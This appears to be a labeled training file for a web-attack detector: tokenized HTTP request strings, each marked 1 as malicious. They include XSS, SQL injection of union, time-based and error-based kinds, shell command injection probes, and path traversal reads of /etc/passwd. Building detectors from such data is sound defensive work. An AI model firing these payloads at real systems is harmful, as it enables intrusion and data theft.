sentences 	 labels
/  ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  \r\n\r\n 	 1
/ javascript / json . exe  \r\n\r\n 	 1
/ y8pmygrp . x ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jwnhuw )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ w4996nr0 . kspx ?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  \r\n\r\n 	 1
/ string / strings / parameters = < object classid = clsid : ae24fdae-03c6-11d1-8b76-0080c744f389 >  < param name = url value = javascript : confirm ( document . location )  >  <  / object >  \r\n\r\n 	 1
/ string / id = 1 & nombre =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 85 & cantidad = 78 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  and  ( 7517 = 3423 )  * 3423 and  (  (  ' aenz '  =  ' aenz  \r\n\r\n 	 1
/ string / strings / parameters = < layer + src =  " http :  /  / localhost "  >  \r\n\r\n 	 1
/ en-us / account / detail . asp ? nchannel =  ' 1  \r\n\r\n 	 1
/ javascript / owa . exe  \r\n\r\n 	 1
/ examples / jsp / error / direct . php ? rf =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  where 7910 = 7910 ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  union all select null , null , null , null , null , null #  \r\n\r\n 	 1
/ htbin / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  '  \r\n\r\n 	 1
/ n1afe1y6 . dll ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = print (  ` echo etzhwz \ necho  $  (  ( 20 + 88 )  )  \ necho etzhwz \ necho etzhwz `  )  ;  /  / etzhwz  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo rppevg )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/ string / strings / parameters = & echo $ ifsninvio $  (  ( 20 + 74 )  )  $  ( echo $ ifsninvio ) ninvio \  \r\n\r\n 	 1
/ cacti / tinybrowser / upload . php ? badfiles = 1 >  < script > alert (  ' tinybrowser_multiple_xss . nasl '  )  <  / script >  \r\n\r\n 	 1
/ string / id = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & nombre = jamn + ibrico & precio = 85 & cantidad = 80 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ fcgi-bin / echo ? foo =  < script > alert (  ' vulnerable '  )  <  / script >  \r\n\r\n 	 1
/ string / str =  $  ( echo zdskke )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ examples / servlets / servlet / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 '  \r\n\r\n 	 1
/ examples / jsp / cal / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script >  \r\n\r\n 	 1
/ main . php ? stuff =  "  & rm \ xa0q39243847 & rem \ xa0  \r\n\r\n 	 1
/ string / strings / parameters = < a href =  "  \ x10javascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  \r\n\r\n 	 1
/ string / strings / parameters = x�? <  / title >  < img src = x onerror = confirm ( 1 )  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  as fxfe where 1148 = 1148 or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  #  \r\n\r\n 	 1
/ string / strings / parameters = '  |  | echo qzicoq $  (  ( 45 + 93 )  )  $  ( echo qzicoq ) qzicoq /  /  \r\n\r\n 	 1
/ string / strings / parameters = < iframe src =  /  onload = eval ( unescape ( this . name . replace (  /  \  / g , null )  )  )  name = fff = new this . contentwindow . window . xmlhttprequest (  )  ; fff . open (  " get "  ,  " xssme2 "  )  ; fff . onreadystatechange = function (  )  { if  ( fff . readystate =  = 4  &  &  fff . status =  = 200 )  { alert ( fff . responsetext )  ;  }  }  ; fff . send (  )  ;  >  <  / iframe >  \r\n\r\n 	 1
/ examples / jsp / cal / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ main . php ? stuff =  " rm \ x0bq27764952 & rem \ x0b  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo uomphd )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  \r\n\r\n 	 1
/ string / modo = entrar & login = haze * l & pwd = pluvimetro & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  ; if ( 6554 = 1534 )  select 6554 else drop function buqb --  \r\n\r\n 	 1
/ string / strings / parameters = -9140 "  "  )  )  union all select 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 , 1623 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ main . php ? logout =  " ver \ x0b > q12574322 & rem \ x0b  \r\n\r\n 	 1
/ examples / jsp / colors / index . php ? op = default & date = 200607 '  union select 1 , 1739511784 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  \r\n\r\n 	 1
/ phpmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 999630768 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ javascript /  . passwd . csproj  \r\n\r\n 	 1
/ string / strings / parameters = < img src =  "  " jav ascript : document . cookie = true ;  "  "  >  \r\n\r\n 	 1
/ string / modo = registro & login = dickens & password = l '  , 4uenga & nombre = bertilda & apellidos = scampini + benito & email = bevens @ elbauldelosrefranes . gov & dni = 25301830j & direccion = avinguda + joan + march ,  + 14 ,  +  & ciudad = gjar & cp = 11630 & provincia = las + palmas & ntc = 4290013346826591 & b1 = registrar  \r\n\r\n 	 1
/  \  \  \  .  .  \  .  .  \  .  .  \  .  .  \  { file }  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  and  (  (  ' xuwl '  like  ' xuwl  \r\n\r\n 	 1
/ string / strings / parameters = -6405 '  union all select 8235 , 8235 , 8235 , 8235 , 8235 #  \r\n\r\n 	 1
/ jackrabbit / search . jsp ? q =  %  "  < script > alert ( 1332010391 )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  |   [  2 -ne  $  ( echo xhmatl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 and  ' bnfu '  like  ' bnfu  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  as oocd where 2919 = 2919 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ help . php ? q =  "  \ x0ddel \ x09q93881688 \ x09 #  \r\n\r\n 	 1
/ string / modo = registro & login = lennard2 & password = segundar & nombre = armelio & apellidos = gochez & email = shankley @ discon . sz & dni = 25054750e & direccion = c /  + fuente + del + rey ,  + s / n ,  +  & ciudad = gavilanes & cp = 36110 & provincia = salamanca & ntc = 679646557157740 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  --  \r\n\r\n 	 1
/ inc / articles . inc . php ? globals [ cheminmodules ]  = xxpathxx  \r\n\r\n 	 1
/ string / modo = entrar & login = dionysus & pwd = any ?  set-cookie :  + tamper = 5765205567234876235 & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual --  vykx  \r\n\r\n 	 1
